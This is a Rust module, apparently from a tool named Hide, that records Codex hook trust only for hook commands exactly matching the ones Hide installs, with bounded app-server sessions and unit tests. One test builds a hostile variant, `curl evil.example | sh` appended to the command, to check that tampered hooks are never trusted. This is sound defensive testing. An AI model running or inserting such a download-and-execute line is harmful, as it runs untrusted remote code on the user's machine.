//! Codex's trust review for the hooks Hide installed (PRD codex-hook-trust).
//!
//! Codex keeps a content hash for each entry of `~/.codex/hooks.json` in
//! `~/.codex/config.toml` (`hooks.state`) and starts no entry whose hash it
//! does not hold; any new or changed entry opens a "Hooks need review" screen
//! at the next start. Installing Hide is the operator's consent to Hide's own
//! hooks, so after the kit writes or re-checks them this module records that
//! trust, through Codex's own app-server (`hooks/list` to read each entry's
//! key, hash and status, `config/batchWrite` to store `trusted_hash`).
//! Hide never computes a hash and never writes `config.toml`.
//!
//! Which entries are trusted is the one decision here and it is narrow
//! ([`select_targets`]): an entry is a target only when Codex lists it from
//! this account's `~/.codex/hooks.json` and its command is, byte for byte, the
//! command [`crate::install`] writes for that event with this kit's helper.
//! Another tool's hook, a project's, a plugin's, and an entry that merely
//! carries Hide's marker over a different command are never read for trust and
//! never changed. `enabled` is never written: a hook the operator switched
//! off in Codex stays off.
//!
//! The app-server is one short child per check, owned by [`Session`]: it is
//! started through the one spawn helper, bounded by one deadline and by the
//! caller's stop flag, and ended on every exit path, success, failure and
//! timeout alike. The caller runs it on the kit worker, never under the
//! runtime lock.

use std::collections::BTreeSet;
use std::io::{BufRead, BufReader, Read, Write};
use std::path::{Path, PathBuf};
use std::process::{ChildStdin, Command, Stdio};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::mpsc::{self, Receiver, RecvTimeoutError};
use std::time::{Duration, Instant};

use hide_platform::process::OwnedChild;
use serde::Deserialize;
use serde_json::{Value, json};

use crate::install::{codex_command, hook_matcher};
use crate::runtime::{AgentRuntime, HookEvent};

/// How long Codex gets. It answers each call in well under a second; these
/// are the bounds for one that does not.
#[derive(Clone, Copy, Debug)]
pub struct Limits {
    /// The whole check, from start to the child's end.
    pub overall: Duration,
    /// One request's share of it.
    pub request: Duration,
}

impl Limits {
    pub const DEFAULT: Self = Self {
        overall: Duration::from_secs(15),
        request: Duration::from_secs(5),
    };
}

/// How long the app-server gets to end on its own once its input is closed,
/// before its whole tree is ended.
const SHUTDOWN_GRACE: Duration = Duration::from_secs(2);

/// How often a wait looks at the caller's stop flag.
const POLL: Duration = Duration::from_millis(50);

/// The longest line, and the most output in all, read from the child. The
/// list holds a few entries; a child that writes more is not answering.
const LINE_CAP: usize = 1024 * 1024;
const OUTPUT_CAP: usize = 4 * 1024 * 1024;

/// JSON-RPC's "method not found", which Codex answers for a method its
/// version does not have.
const METHOD_NOT_FOUND: i64 = -32601;

/// What one check ended as.
#[derive(Clone, Debug, Eq, PartialEq)]
pub enum TrustOutcome {
    /// This Codex has no hook trust (its app-server does not know
    /// `hooks/list`): nothing to record and nothing to show.
    Unsupported,
    /// Every entry of Hide's that needed it is trusted now; `recorded` is how
    /// many this check wrote, and zero is a check that wrote nothing.
    Trusted { recorded: usize },
    /// Codex could not be asked, or did not do what it was asked.
    Failed(TrustFailure),
}

#[derive(Clone, Debug, Eq, PartialEq)]
pub struct TrustFailure {
    pub kind: TrustFailureKind,
    /// Codex's own words or the system's, for the log; never for the screen.
    pub detail: String,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum TrustFailureKind {
    /// The `codex` program could not be started, or ended before answering.
    CouldNotStart,
    /// Codex answered an error, or something Hide cannot read.
    Refused,
    /// Codex did not answer in time and was stopped.
    TimedOut,
    /// Codex accepted the write and the entries are still not trusted.
    Unconfirmed,
    /// Hide was quitting and stopped the child.
    Stopped,
}

impl TrustFailureKind {
    /// The few words the part's reason line carries.
    pub fn summary(self) -> &'static str {
        match self {
            Self::CouldNotStart => "it could not be started",
            Self::Refused => "it refused",
            Self::TimedOut => "it did not answer in time",
            Self::Unconfirmed => "it did not keep the record",
            Self::Stopped => "Hide was quitting",
        }
    }
}

impl TrustFailure {
    fn new(kind: TrustFailureKind, detail: impl Into<String>) -> Self {
        Self {
            kind,
            detail: detail.into(),
        }
    }
}

/// Records Codex's trust for the entries Hide wrote in `home`'s
/// `~/.codex/hooks.json`, where `helper` is the helper those entries run.
/// Writes nothing when every such entry is already trusted or when the file
/// holds none (the same check twice leaves `config.toml` alone).
pub fn trust_own_hooks(
    codex: &Path,
    home: &Path,
    helper: &Path,
    stop: &AtomicBool,
) -> TrustOutcome {
    trust_own_hooks_within(codex, home, helper, stop, Limits::DEFAULT)
}

/// [`trust_own_hooks`] with the bounds named, for a caller (a test) that
/// needs a Codex that does not answer to be given up on sooner.
pub fn trust_own_hooks_within(
    codex: &Path,
    home: &Path,
    helper: &Path,
    stop: &AtomicBool,
    limits: Limits,
) -> TrustOutcome {
    let hooks_json = AgentRuntime::Codex.config_path(home);
    let expected = expected_entries(helper);
    let mut session = match Session::start(codex, home, stop, limits) {
        Ok(session) => session,
        Err(failure) => return TrustOutcome::Failed(failure),
    };
    let targets = match session.list(&hooks_json, &expected) {
        Ok(Listing::Targets(targets)) => targets,
        Ok(Listing::Unsupported) => return TrustOutcome::Unsupported,
        Err(failure) => return TrustOutcome::Failed(failure),
    };
    if targets.is_empty() {
        return TrustOutcome::Trusted { recorded: 0 };
    }
    if let Err(failure) = session.record(&targets) {
        return TrustOutcome::Failed(failure);
    }
    match session.list(&hooks_json, &expected) {
        Ok(Listing::Targets(left)) if left.is_empty() => TrustOutcome::Trusted {
            recorded: targets.len(),
        },
        Ok(Listing::Targets(left)) => TrustOutcome::Failed(TrustFailure::new(
            TrustFailureKind::Unconfirmed,
            format!(
                "codex accepted the write and still lists {} of {} entries as not trusted",
                left.len(),
                targets.len()
            ),
        )),
        Ok(Listing::Unsupported) => TrustOutcome::Failed(TrustFailure::new(
            TrustFailureKind::Refused,
            "codex stopped knowing hooks/list between two calls",
        )),
        Err(failure) => TrustOutcome::Failed(failure),
    }
}

/// What Codex lists for one entry Hide writes.
#[derive(Clone, Debug, Eq, PartialEq)]
struct Expected {
    /// Codex names an event the way the wire does: `sessionStart`.
    event: String,
    command: String,
    matcher: Option<String>,
}

fn expected_entries(helper: &Path) -> Vec<Expected> {
    HookEvent::ALL
        .into_iter()
        .map(|event| Expected {
            event: wire_event_name(event),
            command: codex_command(helper, event),
            matcher: hook_matcher(AgentRuntime::Codex, event).map(str::to_owned),
        })
        .collect()
}

fn wire_event_name(event: HookEvent) -> String {
    let name = event.name();
    let mut characters = name.chars();
    match characters.next() {
        Some(first) => first.to_ascii_lowercase().to_string() + characters.as_str(),
        None => String::new(),
    }
}

/// One entry of `hooks/list`, as much of it as the decision reads.
#[derive(Clone, Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct Listed {
    key: String,
    event_name: String,
    #[serde(default)]
    handler_type: Option<String>,
    #[serde(default)]
    command: Option<String>,
    #[serde(default)]
    matcher: Option<String>,
    source: String,
    source_path: String,
    #[serde(default)]
    is_managed: bool,
    current_hash: String,
    trust_status: String,
}

/// An entry to record: Codex's key for it and the hash Codex computed.
#[derive(Clone, Debug, Eq, PartialEq)]
struct Target {
    key: String,
    hash: String,
}

/// The entries Hide records trust for, out of what Codex lists. This is the
/// whole of Hide's authority over Codex's review, so it asks for everything at
/// once and is narrower than it has to be:
///
/// - the entry comes from the user's own file, this account's
///   `~/.codex/hooks.json`, and is not managed (a project layer, a plugin and
///   a managed file can name the same command and are not Hide's write);
/// - it is a command hook;
/// - its event is one Hide registers, its command is, byte for byte, the
///   command Hide writes for that event with this kit's helper, and its
///   matcher is the one Hide writes for it (none today);
/// - Codex does not trust it yet (`untrusted`, or `modified` after a change).
fn select_targets(expected: &[Expected], listed: &[Listed], hooks_json: &Path) -> Vec<Target> {
    let wanted = canonical_or_given(hooks_json);
    let mut seen = BTreeSet::new();
    listed
        .iter()
        .filter(|hook| hook.source == "user" && !hook.is_managed)
        .filter(|hook| hook.handler_type.as_deref() == Some("command"))
        .filter(|hook| matches!(hook.trust_status.as_str(), "untrusted" | "modified"))
        .filter(|hook| canonical_or_given(Path::new(&hook.source_path)) == wanted)
        .filter(|hook| {
            hook.command.as_deref().is_some_and(|command| {
                expected.iter().any(|wanted| {
                    wanted.event == hook.event_name
                        && wanted.command == command
                        && wanted.matcher == hook.matcher
                })
            })
        })
        .filter(|hook| seen.insert(hook.key.clone()))
        .map(|hook| Target {
            key: hook.key.clone(),
            hash: hook.current_hash.clone(),
        })
        .collect()
}

/// Two spellings of one file compare equal; a file that cannot be resolved is
/// compared as given, which can only fail to match.
fn canonical_or_given(path: &Path) -> PathBuf {
    hide_platform::fs::identity::canonical(path).unwrap_or_else(|_| path.to_path_buf())
}

enum Listing {
    Targets(Vec<Target>),
    Unsupported,
}

/// One line the child printed, or the end of its output.
enum Line {
    Message(Value),
    /// The output ended: the child exited or closed it.
    Eof,
    /// The child printed more than the caps allow.
    Overflow,
}

/// One owned `codex app-server` over stdio.
struct Session<'a> {
    child: OwnedChild,
    stdin: Option<ChildStdin>,
    incoming: Receiver<Line>,
    reader: Option<std::thread::JoinHandle<()>>,
    next_id: u64,
    started: Instant,
    limits: Limits,
    stop: &'a AtomicBool,
    ended: bool,
}

impl<'a> Session<'a> {
    /// Starts the app-server and completes the handshake. Codex is run with the
    /// account's home and its own `.codex` named outright, in an environment
    /// built rather than inherited (the login variables and nothing else), so a `CODEX_HOME` the launching shell
    /// carried never redirects whose hooks are trusted; its `PATH` is the one
    /// it was found on, so a script that runs `node` finds it. The working
    /// directory is the account's home, so no project layer is read.
    fn start(
        codex: &Path,
        home: &Path,
        stop: &'a AtomicBool,
        limits: Limits,
    ) -> Result<Self, TrustFailure> {
        let path = crate::diagnosis::cli_path(home).ok_or_else(|| {
            TrustFailure::new(
                TrustFailureKind::CouldNotStart,
                format!("a folder under {} cannot be put on a PATH", home.display()),
            )
        })?;
        let mut command = Command::new(codex);
        hide_platform::process::restrict_to_login_environment(&mut command);
        command
            .arg("app-server")
            .current_dir(home)
            .env(hide_platform::host::HOME_VARIABLE, home)
            .env("CODEX_HOME", AgentRuntime::Codex.home_directory(home))
            .env("PATH", path)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::null());
        let mut child = OwnedChild::spawn(&mut command).map_err(|error| {
            TrustFailure::new(
                TrustFailureKind::CouldNotStart,
                format!("{} could not start: {error}", codex.display()),
            )
        })?;
        let stdin = child.take_stdin();
        let stdout = child.take_stdout();
        let (Some(stdin), Some(stdout)) = (stdin, stdout) else {
            return Err(TrustFailure::new(
                TrustFailureKind::CouldNotStart,
                "codex app-server has no standard input or output",
            ));
        };
        let (sender, incoming) = mpsc::channel();
        let reader = std::thread::Builder::new()
            .name("codex-trust-reader".into())
            .spawn(move || read_lines(stdout, &sender))
            .map_err(|error| {
                TrustFailure::new(
                    TrustFailureKind::CouldNotStart,
                    format!("the reader thread could not start: {error}"),
                )
            })?;
        let mut session = Self {
            child,
            stdin: Some(stdin),
            incoming,
            reader: Some(reader),
            next_id: 0,
            started: Instant::now(),
            limits,
            stop,
            ended: false,
        };
        session
            .request(
                "initialize",
                json!({"clientInfo": {"name": "hide-agent-hooks", "version": env!("CARGO_PKG_VERSION")}}),
            )
            .map_err(Failed::into_failure)?;
        session
            .write(&json!({"jsonrpc": "2.0", "method": "initialized", "params": {}}))
            .map_err(Failed::into_failure)?;
        Ok(session)
    }

    /// Reads Codex's hooks and picks the ones to record.
    fn list(&mut self, hooks_json: &Path, expected: &[Expected]) -> Result<Listing, TrustFailure> {
        let answer = match self.request("hooks/list", json!({})) {
            Ok(answer) => answer,
            Err(Failed::Rejected {
                code: METHOD_NOT_FOUND,
                ..
            }) => return Ok(Listing::Unsupported),
            Err(failed) => return Err(failed.into_failure()),
        };
        let listed = hooks_of(&answer).map_err(|detail| {
            TrustFailure::new(
                TrustFailureKind::Refused,
                format!("hooks/list answered something Hide cannot read: {detail}"),
            )
        })?;
        Ok(Listing::Targets(select_targets(
            expected, &listed, hooks_json,
        )))
    }

    /// Stores `trusted_hash` for each target in one write. The entries go in as
    /// table keys of the `hooks.state` object, so the key's path and colons are
    /// never a dotted key path Hide would have to quote, and an upsert leaves
    /// each table's other fields (`enabled`) as they are.
    fn record(&mut self, targets: &[Target]) -> Result<(), TrustFailure> {
        let state: serde_json::Map<String, Value> = targets
            .iter()
            .map(|target| (target.key.clone(), json!({"trusted_hash": target.hash})))
            .collect();
        self.request(
            "config/batchWrite",
            json!({"edits": [{
                "keyPath": "hooks.state",
                "mergeStrategy": "upsert",
                "value": state,
            }]}),
        )
        .map(|_| ())
        .map_err(Failed::into_failure)
    }

    fn write(&mut self, message: &Value) -> Result<(), Failed> {
        let mut line = serde_json::to_vec(message)
            .map_err(|error| Failed::Gone(format!("a request could not be encoded: {error}")))?;
        line.push(b'\n');
        let stdin = self
            .stdin
            .as_mut()
            .ok_or_else(|| Failed::Gone("codex app-server's input is closed".to_owned()))?;
        stdin
            .write_all(&line)
            .and_then(|()| stdin.flush())
            .map_err(|error| {
                Failed::Gone(format!("codex app-server cannot be written to: {error}"))
            })
    }

    /// One request and its answer. A request the server declines is
    /// [`Failed::Rejected`]; no answer in time is [`Failed::TimedOut`].
    fn request(&mut self, method: &'static str, params: Value) -> Result<Value, Failed> {
        self.next_id += 1;
        let id = self.next_id;
        self.write(&json!({"jsonrpc": "2.0", "id": id, "method": method, "params": params}))?;
        let request_end = Instant::now() + self.limits.request;
        loop {
            if self.stop.load(Ordering::Relaxed) {
                return Err(Failed::Stopped);
            }
            let now = Instant::now();
            if now >= request_end || self.started + self.limits.overall <= now {
                return Err(Failed::TimedOut { method });
            }
            let wait = POLL.min(request_end - now);
            let message = match self.incoming.recv_timeout(wait) {
                Ok(Line::Message(message)) => message,
                Ok(Line::Eof) | Err(RecvTimeoutError::Disconnected) => {
                    return Err(Failed::Gone(format!(
                        "codex app-server ended before it answered {method}"
                    )));
                }
                Ok(Line::Overflow) => {
                    return Err(Failed::Unreadable(format!(
                        "codex app-server printed more than {OUTPUT_CAP} bytes before it answered {method}"
                    )));
                }
                Err(RecvTimeoutError::Timeout) => continue,
            };
            if message.get("id").and_then(Value::as_u64) == Some(id)
                && message.get("method").is_none()
            {
                if let Some(error) = message.get("error") {
                    return Err(Failed::Rejected {
                        method,
                        code: error.get("code").and_then(Value::as_i64).unwrap_or(0),
                        message: error
                            .get("message")
                            .and_then(Value::as_str)
                            .unwrap_or("")
                            .to_owned(),
                    });
                }
                return Ok(message.get("result").cloned().unwrap_or(Value::Null));
            }
            // A request the server makes of its client (an approval): Hide
            // serves none, and answering keeps the server from waiting on it.
            if let (Some(server_id), Some(_)) = (message.get("id"), message.get("method")) {
                let refusal = json!({
                    "jsonrpc": "2.0",
                    "id": server_id,
                    "error": {"code": METHOD_NOT_FOUND, "message": "hide does not serve requests"},
                });
                self.write(&refusal)?;
            }
        }
    }

    /// Ends the child through one path: close its input (its own shutdown
    /// signal), give it a moment, then end its whole tree, reap it and join
    /// the reader. Every exit goes through here, by `Drop` when not before.
    fn end(&mut self) {
        if std::mem::replace(&mut self.ended, true) {
            return;
        }
        self.stdin = None;
        let grace = Instant::now() + SHUTDOWN_GRACE;
        while Instant::now() < grace {
            match self.incoming.recv_timeout(POLL) {
                Ok(Line::Eof) | Err(RecvTimeoutError::Disconnected) => break,
                Ok(_) | Err(RecvTimeoutError::Timeout) => {}
            }
            if self.stop.load(Ordering::Relaxed) {
                break;
            }
        }
        let _ = self.child.kill_tree();
        let _ = self.child.wait();
        if let Some(reader) = self.reader.take() {
            let _ = reader.join();
        }
    }
}

impl Drop for Session<'_> {
    fn drop(&mut self) {
        self.end();
    }
}

/// Why one request has no answer.
enum Failed {
    Rejected {
        method: &'static str,
        code: i64,
        message: String,
    },
    TimedOut {
        method: &'static str,
    },
    /// The child or its connection is gone.
    Gone(String),
    /// The child answers with more than Hide reads.
    Unreadable(String),
    Stopped,
}

impl Failed {
    fn into_failure(self) -> TrustFailure {
        match self {
            Self::Rejected {
                method,
                code,
                message,
            } => TrustFailure::new(
                TrustFailureKind::Refused,
                format!("codex answered {method} with error {code}: {message}"),
            ),
            Self::TimedOut { method } => TrustFailure::new(
                TrustFailureKind::TimedOut,
                format!("codex app-server did not answer {method} in time and was stopped"),
            ),
            Self::Unreadable(detail) => TrustFailure::new(TrustFailureKind::Refused, detail),
            Self::Gone(detail) => TrustFailure::new(TrustFailureKind::CouldNotStart, detail),
            Self::Stopped => TrustFailure::new(
                TrustFailureKind::Stopped,
                "codex app-server was stopped because Hide is quitting",
            ),
        }
    }
}

/// The hooks of a `hooks/list` answer, across every cwd it lists.
fn hooks_of(answer: &Value) -> Result<Vec<Listed>, String> {
    let entries = answer
        .get("data")
        .and_then(Value::as_array)
        .ok_or_else(|| "there is no data list".to_owned())?;
    let mut hooks = Vec::new();
    for entry in entries {
        let listed = entry
            .get("hooks")
            .and_then(Value::as_array)
            .ok_or_else(|| "an entry has no hooks list".to_owned())?;
        for hook in listed {
            hooks.push(
                serde_json::from_value::<Listed>(hook.clone())
                    .map_err(|error| error.to_string())?,
            );
        }
    }
    Ok(hooks)
}

/// Feeds the child's lines to the session, stopping at the end of output or
/// when it prints more than the caps allow.
fn read_lines(stdout: impl Read, sender: &mpsc::Sender<Line>) {
    let mut reader = BufReader::new(stdout);
    let mut total = 0usize;
    loop {
        let mut line = Vec::new();
        let read = (&mut reader)
            .take(LINE_CAP as u64 + 1)
            .read_until(b'\n', &mut line);
        match read {
            Ok(0) | Err(_) => break,
            Ok(count) => {
                total += count;
                if line.len() > LINE_CAP || total > OUTPUT_CAP {
                    let _ = sender.send(Line::Overflow);
                    return;
                }
            }
        }
        if let Ok(message) = serde_json::from_slice::<Value>(&line)
            && sender.send(Line::Message(message)).is_err()
        {
            return;
        }
    }
    let _ = sender.send(Line::Eof);
}

#[cfg(test)]
mod tests {
    use super::*;

    const HELPER: &str = "/kit/hide-agent-hooks";

    fn expected() -> Vec<Expected> {
        expected_entries(Path::new(HELPER))
    }

    fn hide_command(event: HookEvent) -> String {
        codex_command(Path::new(HELPER), event)
    }

    fn listed(event: &str, command: &str, trust: &str, key: &str) -> Listed {
        Listed {
            key: key.to_owned(),
            event_name: event.to_owned(),
            handler_type: Some("command".to_owned()),
            command: Some(command.to_owned()),
            matcher: None,
            source: "user".to_owned(),
            source_path: "/home/.codex/hooks.json".to_owned(),
            is_managed: false,
            current_hash: format!("sha256:{key}"),
            trust_status: trust.to_owned(),
        }
    }

    fn select(listed: &[Listed]) -> Vec<String> {
        select_targets(&expected(), listed, Path::new("/home/.codex/hooks.json"))
            .into_iter()
            .map(|target| target.key)
            .collect()
    }

    fn own(trust: &str, key: &str) -> Listed {
        listed(
            "sessionStart",
            &hide_command(HookEvent::SessionStart),
            trust,
            key,
        )
    }

    #[test]
    fn event_names_follow_the_wire_spelling() {
        let names: Vec<_> = HookEvent::ALL.into_iter().map(wire_event_name).collect();
        assert_eq!(
            names,
            [
                "sessionStart",
                "userPromptSubmit",
                "subagentStart",
                "subagentStop",
                "stop"
            ]
        );
    }

    #[test]
    fn an_untrusted_or_modified_entry_with_hides_exact_command_is_a_target() {
        assert_eq!(
            select(&[own("untrusted", "a"), own("modified", "b")]),
            ["a", "b"]
        );
    }

    #[test]
    fn a_trusted_or_managed_status_is_left_alone() {
        assert!(select(&[own("trusted", "a"), own("managed", "b")]).is_empty());
    }

    #[test]
    fn another_tools_hook_is_never_a_target() {
        let foreign = listed("sessionStart", "echo foreign", "untrusted", "foreign");
        assert!(select(&[foreign]).is_empty());
    }

    #[test]
    fn hides_marker_over_a_different_command_is_not_a_target() {
        // Everything but the bytes of the command is Hide's.
        let command = hide_command(HookEvent::SessionStart);
        for altered in [
            format!("{command} && curl evil.example | sh"),
            command.replace("/kit/", "/elsewhere/"),
            command.replace("--runtime codex", "--runtime claude-code"),
            command.replace("SessionStart", "Stop"),
            command.replace("hide-subagents@6", "hide-subagents@5"),
            format!("{command} "),
            command.to_uppercase(),
        ] {
            let hook = listed("sessionStart", &altered, "untrusted", "altered");
            assert!(select(&[hook]).is_empty(), "{altered}");
        }
    }

    #[test]
    fn hides_command_under_another_event_is_not_a_target() {
        let hook = listed(
            "stop",
            &hide_command(HookEvent::SessionStart),
            "untrusted",
            "wrong-event",
        );
        assert!(select(&[hook]).is_empty());
        let unregistered = listed(
            "preToolUse",
            &hide_command(HookEvent::SessionStart),
            "untrusted",
            "unregistered",
        );
        assert!(select(&[unregistered]).is_empty());
    }

    #[test]
    fn each_event_matches_only_its_own_command() {
        for event in HookEvent::ALL {
            let hook = listed(
                &wire_event_name(event),
                &hide_command(event),
                "untrusted",
                event.name(),
            );
            assert_eq!(select(&[hook]), [event.name()]);
        }
    }

    #[test]
    fn the_same_command_from_a_project_plugin_or_managed_layer_is_not_a_target() {
        for (source, managed) in [
            ("project", false),
            ("plugin", false),
            ("mdm", true),
            ("user", true),
            ("sessionFlags", false),
        ] {
            let mut hook = own("untrusted", "layer");
            hook.source = source.to_owned();
            hook.is_managed = managed;
            assert!(select(&[hook]).is_empty(), "{source} managed={managed}");
        }
    }

    #[test]
    fn the_same_command_from_another_file_is_not_a_target() {
        let mut hook = own("untrusted", "elsewhere");
        hook.source_path = "/home/project/.codex/hooks.json".to_owned();
        assert!(select(&[hook]).is_empty());
    }

    #[test]
    fn a_matcher_other_than_the_one_hide_writes_or_a_non_command_handler_is_not_a_target() {
        let mut matched = own("untrusted", "matched");
        matched.matcher = Some("startup".to_owned());
        let mut prompt = own("untrusted", "prompt");
        prompt.handler_type = Some("prompt".to_owned());
        prompt.command = None;
        assert!(select(&[matched, prompt]).is_empty());
    }

    #[test]
    fn the_matcher_must_equal_the_one_hide_writes_for_that_event() {
        let mut expected = expected();
        expected[0].matcher = Some("Bash".to_owned());
        let pick = |matcher: Option<&str>| {
            let mut hook = own("untrusted", "guarded");
            hook.matcher = matcher.map(str::to_owned);
            select_targets(&expected, &[hook], Path::new("/home/.codex/hooks.json")).len()
        };
        assert_eq!(pick(Some("Bash")), 1);
        assert_eq!(pick(None), 0);
        assert_eq!(pick(Some("bash")), 0);
        assert_eq!(pick(Some("Bash|Edit")), 0);
    }

    #[test]
    fn one_key_is_recorded_once() {
        assert_eq!(
            select(&[own("untrusted", "a"), own("untrusted", "a")]),
            ["a"]
        );
    }

    #[test]
    fn a_list_answer_is_read_across_every_cwd() {
        let hook = json!({
            "key": "k", "eventName": "stop", "handlerType": "command", "command": "c",
            "matcher": null, "source": "user", "sourcePath": "/p", "isManaged": false,
            "currentHash": "sha256:1", "trustStatus": "untrusted",
            "enabled": true, "timeoutSec": 8, "displayOrder": 0,
        });
        let answer = json!({"data": [{"cwd": "/a", "hooks": [hook.clone()]}, {"cwd": "/b", "hooks": [hook]}]});
        assert_eq!(hooks_of(&answer).unwrap().len(), 2);
        assert!(hooks_of(&json!({})).is_err());
        assert!(hooks_of(&json!({"data": [{"cwd": "/a"}]})).is_err());
    }
}
